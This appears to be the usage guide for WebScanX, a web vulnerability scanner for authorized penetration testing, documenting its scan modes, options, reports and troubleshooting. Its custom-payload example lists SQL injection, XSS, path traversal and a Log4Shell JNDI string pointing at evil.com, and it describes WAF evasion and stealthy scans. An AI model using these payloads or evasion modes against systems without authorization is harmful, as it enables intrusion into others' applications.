# WebScanX - Comprehensive Usage Guide

## Table of Contents

1. [Introduction](#introduction)
2. [Quick Start](#quick-start)
3. [Scanning Modes](#scanning-modes)
4. [Command Line Options](#command-line-options)
5. [Advanced Features](#advanced-features)
6. [Report Formats](#report-formats)
7. [AI-Powered Analysis](#ai-powered-analysis)
8. [Best Practices](#best-practices)
9. [Troubleshooting](#troubleshooting)

---

## Introduction

WebScanX is a comprehensive web application security testing framework designed for professional penetration testers and security researchers. It combines traditional vulnerability scanning with AI-powered analysis to provide deep insights into web application security.

### Key Features

- **Multiple Scanning Modes**: Silent, Standard, Deep, and AI-Guided
- **Comprehensive Coverage**: SQLi, XSS, RCE, LFI, SSRF, XXE, IDOR, and more
- **AI-Powered Analysis**: Correlation, pattern recognition, and false positive reduction
- **WAF Detection & Evasion**: Identify and bypass web application firewalls
- **Professional Reports**: JSON, HTML, XML, and PDF formats
- **Modular Architecture**: Easy to extend and customize

---

## Quick Start

### Basic Scan
```bash
python3 webscanx.py -t https://example.com
```

### Silent Mode (Stealthy)
```bash
python3 webscanx.py -t https://example.com --mode silent
```

### Deep Analysis
```bash
python3 webscanx.py -t https://example.com --mode deep
```

### AI-Guided Scan
```bash
python3 webscanx.py -t https://example.com --mode ai --ai
```

---

## Scanning Modes

### 1. Silent Mode (`--mode silent`)

**Purpose**: Minimal footprint reconnaissance

**Characteristics**:
- Low request rate
- Passive information gathering
- Minimal WAF/IPS triggering
- Longer scan time

**Use Cases**:
- Initial reconnaissance
- Avoiding detection
- Testing sensitive targets

**Example**:
```bash
python3 webscanx.py -t https://example.com --mode silent --delay 2
```

### 2. Standard Mode (`--mode standard`)

**Purpose**: Balanced scanning with good coverage

**Characteristics**:
- Moderate request rate
- Comprehensive vulnerability testing
- Balanced speed and accuracy
- Default mode

**Use Cases**:
- General security assessments
- Regular penetration tests
- Most common scenarios

**Example**:
```bash
python3 webscanx.py -t https://example.com --mode standard
```

### 3. Deep Mode (`--mode deep`)

**Purpose**: In-depth analysis with correlation

**Characteristics**:
- High request rate
- Extensive payload testing
- Correlation analysis
- Longer scan time

**Use Cases**:
- Thorough security audits
- Finding complex vulnerabilities
- Attack chain detection

**Example**:
```bash
python3 webscanx.py -t https://example.com --mode deep --threads 20
```

### 4. AI-Guided Mode (`--mode ai`)

**Purpose**: Intelligent scanning with AI analysis

**Characteristics**:
- Adaptive payload selection
- Real-time correlation
- Pattern learning
- False positive reduction

**Use Cases**:
- Advanced security testing
- Reducing false positives
- Learning from scan history

**Example**:
```bash
python3 webscanx.py -t https://example.com --mode ai --ai
```

---

## Command Line Options

### Required Arguments

```bash
-t, --target URL          Target URL or domain to scan
```

### Scan Configuration

```bash
--mode MODE               Scanning mode (silent, standard, deep, ai)
--threads N               Number of concurrent threads (default: 10)
--timeout N               Request timeout in seconds (default: 30)
--delay N                 Delay between requests in seconds
--rate-limit N            Maximum requests per second
--retries N               Number of retries for failed requests (default: 3)
```

### Authentication

```bash
--auth TOKEN              Authentication header or token
--cookie STRING           Cookie string for authenticated scanning
--username USER           Username for basic authentication
--password PASS           Password for basic authentication
```

**Examples**:
```bash
# Cookie-based authentication
python3 webscanx.py -t https://example.com --cookie "session=abc123; token=xyz789"

# Bearer token
python3 webscanx.py -t https://example.com --auth "Bearer eyJhbGc..."

# Basic authentication
python3 webscanx.py -t https://example.com --username admin --password secret
```

### AI Options

```bash
--ai                      Enable AI-powered analysis
--ai-model MODEL          AI model to use (default: default)
```

### Wordlists

```bash
-w, --wordlist FILE       Custom wordlist for directory/file discovery
--payloads FILE           Custom payload file for vulnerability testing
```

**Example**:
```bash
python3 webscanx.py -t https://example.com -w /usr/share/wordlists/dirb/common.txt
```

### Module Selection

```bash
--modules LIST            Modules to run (comma-separated)
--skip-modules LIST       Modules to skip (comma-separated)
```

**Available Modules**:
- `reconnaissance` - Information gathering
- `discovery` - Content discovery
- `vulnerability` - Vulnerability testing
- `waf_detection` - WAF detection
- `evasion` - WAF evasion techniques

**Examples**:
```bash
# Run specific modules only
python3 webscanx.py -t https://example.com --modules reconnaissance,vulnerability

# Skip certain modules
python3 webscanx.py -t https://example.com --skip-modules waf_detection
```

### Report Options

```bash
--format FORMATS          Report formats (comma-separated: json,html,pdf,xml)
-o, --output DIR          Output directory for reports (default: ./reports)
--template FILE           Custom report template
```

**Examples**:
```bash
# JSON report only
python3 webscanx.py -t https://example.com --format json

# Multiple formats
python3 webscanx.py -t https://example.com --format json,html,pdf -o ./my_reports
```

### Network Options

```bash
--proxy URL               Proxy URL (http://host:port)
--user-agent STRING       Custom User-Agent string
--verify-ssl              Verify SSL certificates (default: false)
--follow-redirects        Follow HTTP redirects (default: true)
```

**Examples**:
```bash
# Through Burp Suite proxy
python3 webscanx.py -t https://example.com --proxy http://127.0.0.1:8080

# Custom User-Agent
python3 webscanx.py -t https://example.com --user-agent "Mozilla/5.0 Custom"
```

### Scope Options

```bash
--scope SCOPE             Scan scope (domain, subdomain, url)
--exclude PATHS           Paths to exclude (comma-separated)
--include PATHS           Paths to include (comma-separated)
```

**Examples**:
```bash
# Limit to specific domain
python3 webscanx.py -t https://example.com --scope domain

# Exclude logout paths
python3 webscanx.py -t https://example.com --exclude "/logout,/signout,/exit"
```

### Control Options

```bash
--resume                  Resume interrupted scan
--no-banner               Suppress banner display
-v, --verbose             Increase verbosity level (-v, -vv, -vvv)
-q, --quiet               Suppress all output except errors
--config FILE             Load configuration from file
--save-config FILE        Save configuration to file
```

---

## Advanced Features

### 1. Configuration Files

Create a YAML configuration file for complex scans:

```yaml
# my_scan.yaml
scan:
  mode: deep
  threads: 15
  timeout: 45
  delay: 0.5

auth:
  enabled: true
  type: bearer
  token: "your-token-here"

ai:
  enabled: true
  correlation_enabled: true
  learning_enabled: true

report:
  formats:
    - json
    - html
    - pdf
  output_dir: ./reports

modules:
  reconnaissance: true
  discovery: true
  vulnerability: true
  waf_detection: true
```

**Usage**:
```bash
python3 webscanx.py -t https://example.com --config my_scan.yaml
```

### 2. Resume Interrupted Scans

If a scan is interrupted, resume it:

```bash
python3 webscanx.py -t https://example.com --resume
```

### 3. Custom Payloads

Create custom payload files:

```text
# custom_payloads.txt
' OR '1'='1
<script>alert('custom')</script>
../../etc/passwd
${jndi:ldap://evil.com}
```

**Usage**:
```bash
python3 webscanx.py -t https://example.com --payloads custom_payloads.txt
```

### 4. Rate Limiting

Control scan speed to avoid overwhelming targets:

```bash
# Maximum 10 requests per second with 0.5s delay
python3 webscanx.py -t https://example.com --rate-limit 10 --delay 0.5
```

### 5. Crawler Configuration

Control web crawler behavior:

```bash
python3 webscanx.py -t https://example.com \
  --crawl-depth 5 \
  --max-pages 200 \
  --concurrent-crawl 15
```

---

## Report Formats

### JSON Report

Machine-readable format for integration:

```bash
python3 webscanx.py -t https://example.com --format json
```

**Output**: `reports/webscanx_report_YYYYMMDD_HHMMSS.json`

**Structure**:
```json
{
  "scan_info": {
    "tool": "WebScanX",
    "version": "1.0.0",
    "target": "https://example.com",
    "start_time": "2024-01-01T00:00:00",
    "duration": "00:15:30"
  },
  "summary": {
    "total_findings": 15,
    "critical_findings": 2,
    "high_findings": 5
  },
  "findings": [...]
}
```

### HTML Report

Professional visual report:

```bash
python3 webscanx.py -t https://example.com --format html
```

**Features**:
- Executive summary with charts
- Detailed vulnerability descriptions
- Evidence and remediation guidance
- Risk assessment

### XML Report

Structured format for tools integration:

```bash
python3 webscanx.py -t https://example.com --format xml
```

### PDF Report

Printable professional report:

```bash
python3 webscanx.py -t https://example.com --format pdf
```

**Note**: Requires `weasyprint` installation

---

## AI-Powered Analysis

### Correlation Detection

AI automatically identifies relationships between findings:

```bash
python3 webscanx.py -t https://example.com --mode ai --ai
```

**Detected Correlations**:
- SQLi + Information Disclosure
- XSS + Missing CSP
- RCE + Weak Authentication
- LFI + Sensitive Files
- SSRF + Cloud Metadata

### Attack Chain Identification

AI identifies potential attack chains:

- Full Compromise Chain
- Data Breach Chain
- Account Takeover Chain
- Infrastructure Compromise

### False Positive Reduction

AI learns from scans to reduce false positives:

```bash
# Learning data stored in ~/.webscanx/ai_data/
ls -la ~/.webscanx/ai_data/learned_patterns.json
```

### Pattern Learning

AI improves over time by learning patterns:

- Vulnerability patterns by technology
- False positive signatures
- Successful payload patterns

---

## Best Practices

### 1. Legal and Ethical

✅ **DO**:
- Get written permission before scanning
- Respect scope boundaries
- Follow responsible disclosure
- Document all findings

❌ **DON'T**:
- Scan without authorization
- Exceed agreed scope
- Exploit vulnerabilities
- Share findings publicly

### 2. Scanning Strategy

**Initial Reconnaissance**:
```bash
python3 webscanx.py -t https://example.com --mode silent --modules reconnaissance
```

**Comprehensive Assessment**:
```bash
python3 webscanx.py -t https://example.com --mode deep --ai --format json,html,pdf
```

**Targeted Testing**:
```bash
python3 webscanx.py -t https://example.com --modules vulnerability --payloads custom.txt
```

### 3. Performance Optimization

**For Fast Scans**:
```bash
python3 webscanx.py -t https://example.com --threads 20 --timeout 15
```

**For Thorough Scans**:
```bash
python3 webscanx.py -t https://example.com --mode deep --threads 10 --timeout 60
```

**For Stealthy Scans**:
```bash
python3 webscanx.py -t https://example.com --mode silent --delay 2 --rate-limit 5
```

### 4. Authentication Best Practices

- Use environment variables for sensitive tokens
- Rotate credentials after testing
- Use dedicated test accounts
- Log all authenticated actions

### 5. Report Management

- Store reports securely
- Encrypt sensitive findings
- Use version control for tracking
- Archive old reports

---

## Troubleshooting

### Common Issues

#### 1. Connection Errors

**Problem**: Cannot connect to target

**Solutions**:
```bash
# Check connectivity
curl -I https://example.com

# Increase timeout
python3 webscanx.py -t https://example.com --timeout 60

# Disable SSL verification
python3 webscanx.py -t https://example.com --verify-ssl false
```

#### 2. Rate Limiting

**Problem**: Target is rate limiting requests

**Solutions**:
```bash
# Add delays
python3 webscanx.py -t https://example.com --delay 1 --rate-limit 5

# Reduce threads
python3 webscanx.py -t https://example.com --threads 5
```

#### 3. Memory Issues

**Problem**: High memory usage

**Solutions**:
```bash
# Reduce concurrency
python3 webscanx.py -t https://example.com --threads 5 --max-pages 50

# Use silent mode
python3 webscanx.py -t https://example.com --mode silent
```

#### 4. Report Generation Fails

**Problem**: Cannot generate reports

**Solutions**:
```bash
# Check output directory
mkdir -p reports
chmod 755 reports

# Try different format
python3 webscanx.py -t https://example.com --format json
```

### Debug Mode

Enable verbose logging:

```bash
# Level 1: Info
python3 webscanx.py -t https://example.com -v

# Level 2: Debug
python3 webscanx.py -t https://example.com -vv

# Level 3: Trace
python3 webscanx.py -t https://example.com -vvv
```

### Log Files

Check logs for detailed information:

```bash
# View logs
tail -f logs/webscanx.log

# Search for errors
grep ERROR logs/webscanx.log
```

---

## Examples

### Example 1: Basic Security Assessment

```bash
python3 webscanx.py \
  -t https://example.com \
  --mode standard \
  --format json,html \
  -o ./reports/example_com
```

### Example 2: Authenticated Deep Scan

```bash
python3 webscanx.py \
  -t https://app.example.com \
  --mode deep \
  --cookie "session=abc123; token=xyz789" \
  --threads 15 \
  --format json,html,pdf \
  -o ./reports/app_scan
```

### Example 3: Stealthy Reconnaissance

```bash
python3 webscanx.py \
  -t https://target.com \
  --mode silent \
  --delay 2 \
  --rate-limit 5 \
  --modules reconnaissance,discovery \
  --format json
```

### Example 4: AI-Powered Comprehensive Scan

```bash
python3 webscanx.py \
  -t https://example.com \
  --mode ai \
  --ai \
  --threads 20 \
  --format json,html,pdf \
  --config advanced_scan.yaml \
  -o ./reports/ai_scan
```

### Example 5: Custom Payload Testing

```bash
python3 webscanx.py \
  -t https://example.com \
  --modules vulnerability \
  --payloads custom_payloads.txt \
  -w custom_wordlist.txt \
  --format json,html
```

---

## Support

For questions, issues, or feature requests:

- **Email**: karimalkashif2003@gmail.com
- **Documentation**: README.md
- **Testing Guide**: TESTING.md

---

## Legal Disclaimer

WebScanX is intended for authorized security testing only. Unauthorized scanning of systems is illegal. The authors are not responsible for misuse of this tool.

**Always obtain written permission before testing any system.**

---

**Happy Hacking! 🛡️**
